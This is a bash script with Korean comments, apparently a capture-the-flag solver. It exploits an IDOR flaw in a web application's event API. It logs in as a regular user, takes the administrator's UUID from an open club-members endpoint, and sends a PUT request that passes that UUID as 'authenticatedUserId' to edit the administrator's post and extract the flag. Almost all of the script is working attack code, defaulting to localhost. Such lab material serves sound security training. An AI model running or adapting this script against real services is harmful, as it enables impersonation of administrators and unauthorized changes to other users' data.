#!/bin/bash

HOST=${1:-localhost}
PORT=${2:-5000}
SERVER_URL="http://${HOST}:${PORT}" 

REGULAR_USER="web_hong"
ADMIN_USERNAME="security_kim"
USER_PASS="password123"
CLUB_ID="3"

echo "--- 1. 일반 사용자 (${REGULAR_USER}) 로그인 및 토큰 획득 ---"

LOGIN_RESPONSE=$(curl -s -X POST $SERVER_URL/auth/login \
-H "Content-Type: application/json" \
-d "{\"username\":\"$REGULAR_USER\", \"password\":\"$USER_PASS\"}")

JWT_TOKEN=$(echo "$LOGIN_RESPONSE" | jq -r '.token')

if [ -z "$JWT_TOKEN" ] || [ "$JWT_TOKEN" == "null" ]; then
    echo "로그인 실패: 토큰을 획득하지 못했습니다. (Response: $LOGIN_RESPONSE)"
    exit 1
fi

echo "로그인 성공. 공격자 토큰 획득."

echo -e "\n--- 2. 관리자 ID 획득 (1차 정보 수집: 클럽 멤버 API) ---"
MEMBERS_RESPONSE=$(curl -s -X GET $SERVER_URL/clubs/$CLUB_ID/members)

ADMIN_ID=$(echo "$MEMBERS_RESPONSE" | jq -r ".data[] | select(.username==\"$ADMIN_USERNAME\") | .id")

if [ -z "$ADMIN_ID" ] || [ "$ADMIN_ID" == "null" ]; then
    echo "관리자 ID 획득 실패. (Response: $MEMBERS_RESPONSE)"
    exit 1
fi

echo "관리자 (${ADMIN_USERNAME})의 UUID 획득 성공: $ADMIN_ID"

echo -e "\n--- 3. 플래그가 포함된 관리자 게시글 ID 획득 ---"

EVENTS_RESPONSE=$(curl -s -X GET $SERVER_URL/events)

FLAG_EVENT_ID=$(echo "$EVENTS_RESPONSE" | jq -r ".data[] | select(.authorUsername==\"$ADMIN_USERNAME\") | .id" | head -n 1)

if [ -z "$FLAG_EVENT_ID" ] || [ "$FLAG_EVENT_ID" == "null" ]; then
    echo "플래그 게시글 ID 획득 실패. 관리자 명의의 게시글이 DB에 없습니다."
    exit 1
fi

echo "플래그 게시글 ID 획득: $FLAG_EVENT_ID"

echo -e "\n--- 4. IDOR 공격 실행: 관리자 명의 위장하여 게시글 수정 ---"

ATTACK_BODY=$(cat <<EOF
{
  "title": "IDOR Attack Success! - Flag Extraction",
  "authenticatedUserId": "$ADMIN_ID" 
}
EOF
)

ATTACK_RESPONSE=$(curl -s -X PUT $SERVER_URL/events/$FLAG_EVENT_ID \
-H "Content-Type: application/json" \
-H "Authorization: Bearer $JWT_TOKEN" \
-d "$ATTACK_BODY")

FLAG_CONTENT=$(echo "$ATTACK_RESPONSE" | jq -r '.data.description')

if [[ "$FLAG_CONTENT" == *flag\{* ]]; then
    echo "$FLAG_CONTENT" | sed -n 's/.*\(flag{.*}\).*/\1/p' 
    exit 0
elif [ -n "$FLAG_CONTENT" ] && [ "$FLAG_CONTENT" != "null" ]; then
    echo "$FLAG_CONTENT"
    exit 0
else
    echo "Exploit failed: Could not extract flag from response." >&2
    echo "DEBUG: Full Response: $ATTACK_RESPONSE" >&2
    exit 1
fi
